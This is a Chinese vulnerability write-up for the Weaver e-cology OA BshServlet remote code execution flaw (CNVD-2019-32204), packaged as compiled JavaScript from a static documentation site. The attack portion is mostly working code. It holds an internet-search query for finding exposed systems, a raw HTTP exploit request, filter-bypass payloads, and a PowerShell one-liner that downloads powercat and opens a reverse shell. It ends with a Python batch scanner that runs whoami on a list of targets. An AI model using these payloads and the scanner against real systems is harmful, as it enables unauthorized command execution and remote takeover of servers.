import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as p,c as o,a as n,b as i,d as l,e as s}from"./app-58e4a7d6.js";const c={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=“泛微-协同办公OA”
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>E-cology 7.0
E-cology 8.0
E-cology 8.1
E-cology 9.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/，如下图在victim上执行了命令“whoami”</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091046499.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>请求包为</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: xxxxxxxx:8088
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">9.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident/5.0<span class="token punctuation">)</span>
Connection: close
Content-Length: <span class="token number">98</span>
Content-Type: application/x-www-form-urlencoded

<span class="token assign-left variable">bsh.script</span><span class="token operator">=</span>ex<span class="token punctuation">\\</span>u0065c<span class="token punctuation">(</span><span class="token string">&quot;cmd /c dir&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token assign-left variable">bsh.servlet.captureOutErr</span><span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">bsh.servlet.output</span><span class="token operator">=</span>raw
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>关于绕过</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>eval%00<span class="token punctuation">(</span><span class="token string">&quot;ex&quot;</span>%2b<span class="token string">&quot;ec(<span class="token entity" title="\\&quot;">\\&quot;</span>whoami<span class="token entity" title="\\&quot;">\\&quot;</span>)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ex<span class="token punctuation">\\</span>u0065c<span class="token punctuation">(</span><span class="token string">&quot;cmd /c dir&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
IEX<span class="token punctuation">(</span>New-Object System.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token parameter variable">-c</span> <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">6666</span> <span class="token parameter variable">-e</span> cmd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,14),r={href:"https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204",target:"_blank",rel:"noopener noreferrer"},d=s(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#/usr/bin/python</span>
<span class="token comment">#coding:utf-8</span>
<span class="token comment">#Author:Ja0k</span>
<span class="token comment">#For Weaver-Ecology-OA_RCE</span>

<span class="token keyword">import</span> urllib3
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>

<span class="token keyword">import</span> requests<span class="token punctuation">,</span>sys

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/xml; charset=utf-8&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Accept&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Cache-Control&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;max-age=0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/x-www-form-urlencoded&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Upgrade-Insecure-Requests&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Content-Length&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;578&#39;</span>
<span class="token punctuation">}</span>

proxies<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;http://127.0.0.1:8080&#39;</span><span class="token punctuation">}</span>
            
<span class="token keyword">def</span> <span class="token function">Poc_check</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>

    Url_Payload1<span class="token operator">=</span><span class="token string">&quot;/bsh.servlet.BshServlet&quot;</span>
    Url_Payload2<span class="token operator">=</span><span class="token string">&quot;/weaver/bsh.servlet.BshServlet&quot;</span>
    Url_Payload3<span class="token operator">=</span><span class="token string">&quot;/weaveroa/bsh.servlet.BshServlet&quot;</span>
    Url_Payload4<span class="token operator">=</span><span class="token string">&quot;/oa/bsh.servlet.BshServlet&quot;</span>
    
    Data_Payload1<span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;bsh.script=exec(&quot;whoami&quot;);&amp;bsh.servlet.output=raw&quot;&quot;&quot;</span>
    Data_Payload2<span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;bsh.script=\\u0065\\u0078\\u0065\\u0063(&quot;whoami&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&quot;&quot;&quot;</span>
    Data_Payload3<span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(bsh.httpServletRequest.getParameter(\\\\&quot;command\\\\&quot;))&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami&quot;&quot;&quot;</span>
    <span class="token keyword">for</span> Url_Payload <span class="token keyword">in</span> <span class="token punctuation">(</span>Url_Payload1<span class="token punctuation">,</span>Url_Payload2<span class="token punctuation">,</span>Url_Payload3<span class="token punctuation">,</span>Url_Payload4<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url<span class="token operator">=</span> target <span class="token operator">+</span> Url_Payload
        <span class="token keyword">for</span> Data_payload <span class="token keyword">in</span> <span class="token punctuation">(</span>Data_Payload1<span class="token punctuation">,</span>Data_Payload2<span class="token punctuation">,</span>Data_Payload3<span class="token punctuation">)</span><span class="token punctuation">:</span> 
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                http_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>Data_payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
                <span class="token comment">#print http_response.status_code</span>
                <span class="token keyword">if</span> http_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> <span class="token string">&quot;;&lt;/script&gt;&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">if</span> <span class="token string">&quot;Login.jsp&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
                            <span class="token keyword">if</span> <span class="token string">&quot;Error&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
                                <span class="token keyword">print</span> <span class="token string">&quot;{0} is a E-cologyOA_RCE Vulnerability&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
                                <span class="token keyword">print</span> <span class="token string">&quot;Server Current Username：{0}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>http_response<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
                <span class="token keyword">elif</span> http_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span> <span class="token string">&quot;{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself &quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">pass</span>              
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>Error<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>    
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        target<span class="token operator">=</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        Poc_check<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>#1.install python Dependencies Library 
pip install requests

#2.批量脚本 执行 
python Weaver-Ecology-OA_RCE-exp.py 


url.txt文件中 是url地址 需要带http协议
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function k(v,m){const a=e("ExternalLinkIcon");return p(),o("div",null,[u,n("p",null,[n("a",r,[i("https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204"),l(a)])]),d])}const g=t(c,[["render",k],["__file","泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204.html.vue"]]);export{g as default};
